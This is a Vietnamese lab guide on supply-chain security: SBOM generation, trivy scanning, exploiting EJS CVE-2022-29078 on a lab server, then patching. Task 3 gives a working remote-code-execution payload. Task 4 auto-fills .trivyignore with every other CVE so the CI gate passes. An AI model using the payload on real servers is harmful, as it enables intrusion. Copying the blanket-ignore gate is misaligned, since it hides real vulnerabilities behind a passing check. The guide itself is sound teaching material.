# HƯỚNG DẪN THỰC HÀNH — Bảo mật chuỗi cung ứng phần mềm (SCA & SBOM)

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| Tên lab | `dso-supplychain-sca` |
| Mức độ | Trung bình |
| Công cụ | syft, trivy (DB offline), npm, jq, curl |

Mục tiêu: sinh SBOM cho ứng dụng Node.js `vuln-notes`, quét SCA phát hiện phụ thuộc chứa CVE, khai thác CVE đó trên máy chủ đang chạy để lấy flag, rồi vá và dựng cổng quét (security gate).

## 2. Kịch bản

Sinh viên là kỹ sư DevSecOps tiếp nhận mã nguồn `vuln-notes`. Mã nguồn nằm ở `~/vuln-notes` trên máy `dev` (172.37.0.10). Máy chủ `appserver` (172.37.0.20) đã chạy ứng dụng ở cổng 3000, dùng đúng phiên bản phụ thuộc có lỗ hổng. Chỉ `dev` có terminal.

## 3. Kiến thức bổ trợ

Chuỗi cung ứng phần mềm (MITRE T1195, OWASP A06:2021): phần lớn mã của ứng dụng đến từ thư viện bên thứ ba; một phụ thuộc chứa CVE là đủ để bị khai thác. SBOM (CycloneDX/SPDX) liệt kê toàn bộ thành phần. SCA đối chiếu phụ thuộc trong lockfile với CSDL lỗ hổng. Template engine EJS trước 3.1.7 (CVE-2022-29078) cho phép chèn mã khi tham số người dùng được dùng làm options của `render`. Security gate dùng mã thoát của công cụ quét để chặn build khi còn lỗ hổng nghiêm trọng.

## 4. Các nhiệm vụ của bài thực hành

Khởi động bằng `imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/dso-supplychain-sca.tar`, sau đó `labtainer dso-supplychain-sca`.

### Nhiệm vụ 1 — `generate_sbom`

```bash
cd ~/vuln-notes
cat package.json
syft dir:. -o cyclonedx-json=sbom.cdx.json
grep -o '"purl"' sbom.cdx.json | wc -l
```

Điều kiện: có `sbom.cdx.json` hợp lệ (CycloneDX) với số thành phần lớn hơn số phụ thuộc trực tiếp (có phụ thuộc gián tiếp). Câu hỏi: vì sao số thành phần trong SBOM nhiều hơn số phụ thuộc khai báo trực tiếp?

### Nhiệm vụ 2 — `scan_dependencies`

```bash
cd ~/vuln-notes
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL .
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o trivy-report.json .
jq -r '.Results[].Vulnerabilities[]? | "\(.Severity) \(.PkgName)@\(.InstalledVersion) \(.VulnerabilityID) fixed:\(.FixedVersion)"' trivy-report.json | sort -u
```

Điều kiện: `trivy-report.json` chứa ít nhất một lỗ hổng HIGH/CRITICAL; xác định đúng package + phiên bản + CVE của phụ thuộc cho phép thực thi mã từ xa (`ejs@3.1.6`, CVE-2022-29078). Câu hỏi: dựa vào tiêu chí nào để ưu tiên xử lý một CVE trước các CVE khác?

### Nhiệm vụ 3 — `exploit_dependency`

Endpoint `/notes?name=` của `appserver` render template bằng EJS và đưa tham số người dùng làm options, nên dính CVE-2022-29078. Chèn mã qua option `outputFunctionName` để chạy lệnh sao chép flag vào thư mục tĩnh rồi tải về:

```bash
Q='settings%5Bview%20options%5D%5BoutputFunctionName%5D=x%3Bprocess.mainModule.require(%27child_process%27).execSync(%27cp%20%2Fflag.txt%20%2Fhome%2Fubuntu%2Fapp%2Fpublic%2Fleak.txt%27)%3Bs'
curl -s "http://appserver:3000/notes?name=x&$Q" >/dev/null
curl -s http://appserver:3000/leak.txt | tee ~/flag_loot.txt
```

Điều kiện: lấy được chuỗi flag cá thể hoá và lưu vào `~/flag_loot.txt`. Câu hỏi: vì sao một lỗ hổng chỉ nằm trong thư viện phụ thuộc lại dẫn tới chiếm quyền thực thi trên máy chủ (liên hệ MITRE T1195)?

### Nhiệm vụ 4 — `remediate_and_gate`

```bash
cd ~/vuln-notes
npm install ejs@3.1.10
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL .
```

Nếu còn CVE của phụ thuộc gián tiếp không thuộc mục tiêu, lập danh sách bỏ qua có kiểm soát (`.trivyignore`) rồi dựng security gate:

```bash
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o after.json .
grep -oE 'CVE-[0-9]{4}-[0-9]+' after.json | grep -v 'CVE-2022-29078' | sort -u > .trivyignore
cat > scan-gate.sh <<'EOS'
#!/bin/bash
set -e
echo "[CI] Running SCA security gate..."
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL --exit-code 1 --ignorefile .trivyignore .
echo "SCA gate PASSED: khong con lo hong HIGH/CRITICAL (ngoai danh sach da duyet)."
EOS
chmod +x scan-gate.sh
./scan-gate.sh | tee ~/gate_result.txt
```

Điều kiện: `ejs` đã lên 3.1.10 (trong lockfile); CVE-2022-29078 không còn trong lần quét lại; `scan-gate.sh` in "SCA gate PASSED" và trả về mã thoát 0. Câu hỏi: đặt security gate SCA trong pipeline CI mang lại lợi ích gì, và hạn chế (false positive) cùng cách giảm thiểu bằng `.trivyignore` có kiểm soát?

Sau khi hoàn thành, chạy `checkwork` để kiểm tra kết quả.

## 5. Ánh xạ khung tham chiếu

MITRE ATT&CK T1195 Supply Chain Compromise; OWASP A06:2021 Vulnerable and Outdated Components; OWASP DevSecOps (SBOM, SCA).
